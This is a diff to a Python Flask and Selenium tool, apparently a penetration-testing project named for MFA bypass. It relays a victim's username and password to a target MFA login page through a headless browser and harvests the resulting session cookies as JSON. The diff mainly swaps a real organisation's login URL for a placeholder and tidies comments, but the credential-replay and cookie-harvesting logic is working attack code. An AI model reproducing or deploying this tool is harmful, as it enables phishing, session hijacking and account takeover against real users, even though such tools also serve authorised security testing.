@@ -6,7 +6,7 @@ from flask import Flask, request, redirect
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 
 # Parameters
-loginURL = 'https://desktop.pingone.com/coalfire/Selection?cmd=selection' # Update this with the URL path to the target MFA app
+loginURL = 'https://target/MFA/page' # Update this with the URL path to the target MFA app
 
 def createBrowser():  
     opts = Options()
@@ -23,7 +23,7 @@ def login(username, passwd):
     driver.find_element_by_id('password').send_keys(passwd)
     #driver.find_element_by_id('token').send_keys(token)
     #driver.find_element_by_id('submit').click()
-    driver.execute_script("javascript:postOk()")
+    driver.execute_script("javascript:postOk()")  #had to use this to call the javscript logon function
     time.sleep(15)
     cookies = json.dumps(driver.get_cookies())
     driver.close()
@@ -47,5 +47,4 @@ def harvest():
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=8080)
-erik@kaloff:~/Desktop/MFA-Bypass/Yippee-Ki-Yay-MFA-er$ 
 
